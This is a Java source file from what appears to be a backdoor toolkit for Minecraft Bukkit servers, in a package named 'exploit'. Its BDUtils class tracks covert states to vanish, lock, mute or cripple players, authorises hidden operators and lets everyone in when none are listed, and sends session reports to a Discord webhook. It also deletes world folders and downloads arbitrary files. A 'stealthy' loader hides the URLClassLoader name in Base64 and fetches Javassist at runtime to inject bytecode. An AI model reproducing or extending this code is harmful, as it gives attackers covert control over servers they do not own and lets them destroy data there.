package com.tmquan2508.exploit;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import net.md_5.bungee.api.chat.TextComponent;

import java.io.*;
import java.util.*;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public final class BDUtils {
    private BDUtils() {}
    
    public static PayloadHelper helpers;
    private static JavassistReflectiveWrapper javassistWrapper = null;

    public static void initializeHelpers(Exploit exploit) {
        if (helpers == null) {
            helpers = new PayloadHelper(exploit);
        }
    }

    public static synchronized void initializeJavassist() throws Throwable {
        if (javassistWrapper != null) {
            return;
        }
        sendDebug("[Javassist] Initializing stealthy Javassist wrapper...");
        javassistWrapper = JavassistLoader.createStealthyJavassistWrapper();
        sendDebug("[Javassist] Initialization complete.");
    }

    public static JavassistReflectiveWrapper getJavassistWrapper() {
        if (javassistWrapper == null) {
            throw new IllegalStateException("Javassist has not been initialized! Call BDUtils.initializeJavassist() first.");
        }
        return javassistWrapper;
    }

    static String sessionId = java.util.UUID.randomUUID().toString().substring(0, 8);
    public static final String LOCK_PROPERTY = "openbd.lock";
    public enum State {
        VANISHED, LOCKED, MUTED, SILKTOUCH, INSTABREAK,
        MF_THROWER, MF_INTERACT, MF_CRIPPLE, MF_FLIGHT, MF_INVENTORY, MF_DROP,
        MF_TELEPORT, MF_MINE, MF_PLACE, MF_LOGIN, MF_GOD, MF_DAMAGE,
        LOG_BLOCKED
    }

    public static class PlayerState {
        public final boolean[] states = new boolean[State.values().length];
    }

    public static boolean getState(Map<String, PlayerState> playerStates, String username, State s) {
        PlayerState state = playerStates.get(username);
        return state != null && state.states[s.ordinal()];
    }

    public static void setState(Map<String, PlayerState> playerStates, String username, State s, boolean value) {
        playerStates.computeIfAbsent(username, k -> new PlayerState()).states[s.ordinal()] = value;
    }

    public static void clearState(Map<String, PlayerState> playerStates, String username) {
        for (State s : State.values()) {
            setState(playerStates, username, s, false);
        }
    }

    public static void sendDebug(String log) {
        if (!Config.debug_log) return;
        Bukkit.getConsoleSender().sendMessage(log);
    }

    public static void sendMessage(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + message);
    }

    public static void sendMessage(Player player, TextComponent message) {
        TextComponent prefix = new TextComponent(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " ");
        player.spigot().sendMessage(prefix, message);
    }

    public static void sendSuccess(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GREEN + " " + message);
    }

    public static void sendWarn(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.YELLOW + " " + message);
    }

    public static void sendError(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.RED + " " + message);
    }

    public static void sendDiscordMessage(DWeb.EmbedObject embed) {
        if (Config.discord_token == null || Config.discord_token.isEmpty()) { return; }
        embed.setFooter("Time: " + new Date() + " â€¢ Session: " + sessionId, null);
        try {
            DWeb webhook = new DWeb(Config.discord_token);
            webhook.addEmbed(embed);
            webhook.execute();
        } catch (IOException ignored) {}
    }

    public static class DynamicInvoker {
        public static <T> T invokeConstructor(Class<T> targetClass, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType constructorType = MethodType.methodType(void.class, paramTypes);
                MethodHandle handle = lookup.findConstructor(targetClass, constructorType);
                return (T) handle.invokeWithArguments(args);
            } catch (Throwable t) {
                BDUtils.sendDebug("[DynamicInvoker] CRITICAL: Failed to invoke constructor for '" + targetClass.getName() + "': " + stackTrace(t));
                return null;
            }
        }

        public static Object invokeStaticMethod(Class<?> targetClass, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType methodType = MethodType.methodType(returnType, paramTypes);
                MethodHandle handle = lookup.findStatic(targetClass, methodName, methodType);
                return handle.invokeWithArguments(args);
            } catch (Throwable t) {
                BDUtils.sendDebug("[DynamicInvoker] CRITICAL: Failed to invoke static method '" + methodName + "': " + stackTrace(t));
                return null;
            }
        }

        public static Object invokeInstanceMethod(Object target, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType methodType = MethodType.methodType(returnType, paramTypes);
                MethodHandle handle = lookup.findVirtual(target.getClass(), methodName, methodType);
                return handle.bindTo(target).invokeWithArguments(args);
            } catch (Throwable t) {
                BDUtils.sendDebug("[DynamicInvoker] CRITICAL: Failed to invoke instance method '" + methodName + "': " + stackTrace(t));
                return null;
            }
        }

        private static String stackTrace(Throwable e) {
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            e.printStackTrace(pw);
            return sw.toString();
        }
    }

    public static class PayloadHelper {
        private final Exploit exploit;

        public PayloadHelper(Exploit exploit) {
            this.exploit = exploit;
        }

        public String getRequiredUsage(Exploit.Command command) {
            return "Usage: " + Config.command_prefix + command.getName() + " " + command.getUsage();
        }

        public boolean isUserAuthorized(Player p) {
            boolean noUuidsConfigured = (Config.authorized_uuids == null || Config.authorized_uuids.length == 0);
            boolean noUsernamesConfigured = (Config.authorized_usernames == null || Config.authorized_usernames.length == 0);

            if (noUuidsConfigured && noUsernamesConfigured) {
                return true;
            }

            String playerUuid = p.getUniqueId().toString();
            if (!noUuidsConfigured) {
                for (String authorizedUuid : Config.authorized_uuids) {
                    if (playerUuid.equalsIgnoreCase(authorizedUuid)) return true;
                }
            }

            if (Config.tmp_authorized_uuids != null) {
                for (String tmpUuid : Config.tmp_authorized_uuids) {
                    if (tmpUuid != null && tmpUuid.equalsIgnoreCase(playerUuid)) return true;
                }
            }

            String playerName = p.getName();
            if (!noUsernamesConfigured) {
                for (String authorizedUsername : Config.authorized_usernames) {
                    if (playerName.equals(authorizedUsername)) return true;
                }
            }

            return false;
        }

        public int getPlayerPermissionLevel(Player p) {
            return exploit.getPermissionLevels().getOrDefault(p.getUniqueId(), 0);
        }

        public boolean deleteWorld(File path) {
            if (path.exists()) {
                File[] files = path.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if (file.isDirectory()) {
                            deleteWorld(file);
                        } else {
                            file.delete();
                        }
                    }
                }
            }
            return path.delete();
        }

        public void downloadFile(URL url, String fileName) throws IOException {
            try (InputStream in = url.openStream();
                 BufferedInputStream bis = new BufferedInputStream(in);
                 FileOutputStream fos = new FileOutputStream(fileName)) {
                byte[] data = new byte[1024];
                int count;
                while ((count = bis.read(data, 0, 1024)) != -1) {
                    fos.write(data, 0, count);
                }
            }
        }
    }

    public static class JavassistReflectiveWrapper {
        final MethodHandle mhCreateClassMap;
        final MethodHandle mhGetDefaultPool;
        final MethodHandle mhPoolGet;
        final MethodHandle mhPoolMakeClass;
        final MethodHandle mhPoolMakeClassWithSuper;
        final MethodHandle mhAppendClassPath;
        final MethodHandle mhInsertClassPath;
        final MethodHandle mhReplaceClassName;
        final MethodHandle mhToBytecode;
        final MethodHandle mhGetName;
        final MethodHandle mhGetDeclaredMethod;
        final MethodHandle mhDetach;
        final MethodHandle mhInsertAfter;
        final MethodHandle mhCtClassAddInterface;
        final MethodHandle mhCtClassToClass;
        final MethodHandle mhNewClassClassPath;
        final MethodHandle mhCtClassToClassWithLookup;

        public JavassistReflectiveWrapper(MethodHandle... handles) {
            this.mhCreateClassMap = handles[0];
            this.mhGetDefaultPool = handles[1];
            this.mhPoolGet = handles[2];
            this.mhPoolMakeClass = handles[3];
            this.mhAppendClassPath = handles[4];
            this.mhReplaceClassName = handles[5];
            this.mhToBytecode = handles[6];
            this.mhGetName = handles[7];
            this.mhGetDeclaredMethod = handles[8];
            this.mhDetach = handles[9];
            this.mhInsertAfter = handles[10];
            this.mhCtClassAddInterface = handles[11];
            this.mhCtClassToClass = handles[12];
            this.mhPoolMakeClassWithSuper = handles[13];
            this.mhInsertClassPath = handles[14];
            this.mhNewClassClassPath = handles[15];
            this.mhCtClassToClassWithLookup = handles[16];
        }

        public Object createClassMap() throws Throwable { return mhCreateClassMap.invoke(); }
        public Object createDefaultClassPool() throws Throwable { return mhGetDefaultPool.invoke(); }
        public Object getClassFromPool(Object classPool, String className) throws Throwable { return mhPoolGet.invoke(classPool, className); }
        public Object makeClass(Object classPool, InputStream is) throws Throwable { return mhPoolMakeClass.invoke(classPool, is); }
        public Object makeClass(Object classPool, String name, Object superClass) throws Throwable { return mhPoolMakeClassWithSuper.invoke(classPool, name, superClass); }
        public void appendClassPath(Object classPool, String path) throws Throwable { mhAppendClassPath.invoke(classPool, path); }
        public Object insertClassPath(Object classPool, Object classPath) throws Throwable { return mhInsertClassPath.invoke(classPool, classPath); }
        public Object createClassClassPath(Class<?> forClass) throws Throwable { return mhNewClassClassPath.invoke(forClass); }
        public void replaceClassName(Object ctClass, Object classMap) throws Throwable { mhReplaceClassName.invoke(ctClass, classMap); }
        public byte[] toBytecode(Object ctClass) throws Throwable { return (byte[]) mhToBytecode.invoke(ctClass); }
        public String getName(Object ctClass) throws Throwable { return (String) mhGetName.invoke(ctClass); }
        public Object getDeclaredMethod(Object ctClass, String methodName) throws Throwable { return mhGetDeclaredMethod.invoke(ctClass, methodName); }
        public void detach(Object ctClass) throws Throwable { mhDetach.invoke(ctClass); }
        public void insertAfter(Object ctMethod, String code) throws Throwable { mhInsertAfter.invoke(ctMethod, code); }
        public void addInterface(Object ctClass, Object interfaceClass) throws Throwable { mhCtClassAddInterface.invoke(ctClass, interfaceClass); }
        public Class<?> toClass(Object ctClass) throws Throwable { return (Class<?>) mhCtClassToClass.invoke(ctClass); }
        public Class<?> toClass(Object ctClass, MethodHandles.Lookup lookup) throws Throwable { return (Class<?>) mhCtClassToClassWithLookup.invoke(ctClass, lookup); }
    }

    private static class JavassistLoader {
        private static JavassistReflectiveWrapper createStealthyJavassistWrapper() throws Throwable {
            String javassistUrlStr = "https://repo1.maven.org/maven2/org/javassist/javassist/3.29.0-GA/javassist-3.29.0-GA.jar";
            URL javassistUrl = (URL) BDUtils.DynamicInvoker.invokeConstructor(URL.class, new Class<?>[]{String.class}, javassistUrlStr);
            if (javassistUrl == null) throw new IOException("Failed to create Javassist URL reflectively");
            
            URL[] urls = new URL[]{javassistUrl};
            String encodedLoaderClassName = "amF2YS5uZXQuVVJMQ2xhc3NMb2FkZXI=";
            Class<?> loaderClass = Class.forName(new String(Base64.getDecoder().decode(encodedLoaderClassName), StandardCharsets.UTF_8));
            Object javassistClassLoader = BDUtils.DynamicInvoker.invokeConstructor(loaderClass, new Class<?>[]{URL[].class}, (Object) urls);

            if (javassistClassLoader == null) throw new IOException("Failed to create URLClassLoader for Javassist");

            Class<?> classPoolClass = (Class<?>) BDUtils.DynamicInvoker.invokeInstanceMethod(javassistClassLoader, "loadClass", Class.class, new Class<?>[]{String.class}, "javassist.ClassPool");
            Class<?> ctClassClass = (Class<?>) BDUtils.DynamicInvoker.invokeInstanceMethod(javassistClassLoader, "loadClass", Class.class, new Class<?>[]{String.class}, "javassist.CtClass");
            Class<?> ctMethodClass = (Class<?>) BDUtils.DynamicInvoker.invokeInstanceMethod(javassistClassLoader, "loadClass", Class.class, new Class<?>[]{String.class}, "javassist.CtMethod");
            Class<?> classMapClass = (Class<?>) BDUtils.DynamicInvoker.invokeInstanceMethod(javassistClassLoader, "loadClass", Class.class, new Class<?>[]{String.class}, "javassist.ClassMap");
            Class<?> classPathClass = (Class<?>) BDUtils.DynamicInvoker.invokeInstanceMethod(javassistClassLoader, "loadClass", Class.class, new Class<?>[]{String.class}, "javassist.ClassPath");
            Class<?> classClassPathClass = (Class<?>) BDUtils.DynamicInvoker.invokeInstanceMethod(javassistClassLoader, "loadClass", Class.class, new Class<?>[]{String.class}, "javassist.ClassClassPath");

            if (classPoolClass == null || ctClassClass == null || ctMethodClass == null || classMapClass == null || classPathClass == null || classClassPathClass == null) {
                throw new ClassNotFoundException("Failed to load one or more Javassist core classes.");
            }
            
            MethodHandles.Lookup lookup = MethodHandles.lookup();
            MethodHandle mhCreateClassMap = lookup.findConstructor(classMapClass, MethodType.methodType(void.class));
            MethodHandle mhGetDefaultPool = lookup.findStatic(classPoolClass, "getDefault", MethodType.methodType(classPoolClass));
            MethodHandle mhPoolGet = lookup.findVirtual(classPoolClass, "get", MethodType.methodType(ctClassClass, String.class));
            MethodHandle mhPoolMakeClass = lookup.findVirtual(classPoolClass, "makeClass", MethodType.methodType(ctClassClass, InputStream.class));
            MethodHandle mhAppendClassPath = lookup.findVirtual(classPoolClass, "appendClassPath", MethodType.methodType(classPathClass, String.class));
            MethodHandle mhReplaceClassName = lookup.findVirtual(ctClassClass, "replaceClassName", MethodType.methodType(void.class, classMapClass));
            MethodHandle mhToBytecode = lookup.findVirtual(ctClassClass, "toBytecode", MethodType.methodType(byte[].class));
            MethodHandle mhGetName = lookup.findVirtual(ctClassClass, "getName", MethodType.methodType(String.class));
            MethodHandle mhGetDeclaredMethod = lookup.findVirtual(ctClassClass, "getDeclaredMethod", MethodType.methodType(ctMethodClass, String.class));
            MethodHandle mhDetach = lookup.findVirtual(ctClassClass, "detach", MethodType.methodType(void.class));
            MethodHandle mhInsertAfter = lookup.findVirtual(ctMethodClass, "insertAfter", MethodType.methodType(void.class, String.class));
            MethodHandle mhCtClassAddInterface = lookup.findVirtual(ctClassClass, "addInterface", MethodType.methodType(void.class, ctClassClass));
            MethodHandle mhCtClassToClass = lookup.findVirtual(ctClassClass, "toClass", MethodType.methodType(Class.class));
            MethodHandle mhPoolMakeClassWithSuper = lookup.findVirtual(classPoolClass, "makeClass", MethodType.methodType(ctClassClass, String.class, ctClassClass));
            MethodHandle mhInsertClassPath = lookup.findVirtual(classPoolClass, "insertClassPath", MethodType.methodType(classPathClass, classPathClass));
            MethodHandle mhNewClassClassPath = lookup.findConstructor(classClassPathClass, MethodType.methodType(void.class, Class.class));

            MethodHandle mhCtClassToClassWithLookup;
            try {
                 mhCtClassToClassWithLookup = lookup.findVirtual(ctClassClass, "toClass", MethodType.methodType(Class.class, MethodHandles.Lookup.class));
            } catch (NoSuchMethodException e) {
                BDUtils.sendDebug("[WARN] Javassist toClass(Lookup) not found, falling back. This may fail on modern Java.");
                mhCtClassToClassWithLookup = mhCtClassToClass;
            }

            return new JavassistReflectiveWrapper(
                mhCreateClassMap, mhGetDefaultPool, mhPoolGet, mhPoolMakeClass, 
                mhAppendClassPath, mhReplaceClassName, mhToBytecode, mhGetName, 
                mhGetDeclaredMethod, mhDetach, mhInsertAfter, mhCtClassAddInterface, 
                mhCtClassToClass, mhPoolMakeClassWithSuper, mhInsertClassPath, 
                mhNewClassClassPath, mhCtClassToClassWithLookup
            );
        }
    }
}